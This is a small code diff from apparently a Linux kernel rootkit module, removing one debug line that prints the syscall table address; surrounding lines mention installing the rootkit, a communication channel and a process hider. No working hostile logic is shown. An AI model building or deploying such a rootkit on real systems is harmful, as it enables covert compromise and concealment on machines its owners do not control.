@@ -28,7 +28,6 @@ static int __init main_init(void) {
 	
 	int error;
 	printInfo("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
-	printInfo("Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
 
 	error = communication_init(); 	// probably should ensure process hider init has finished.. before this is called..
 	if (error) return error;
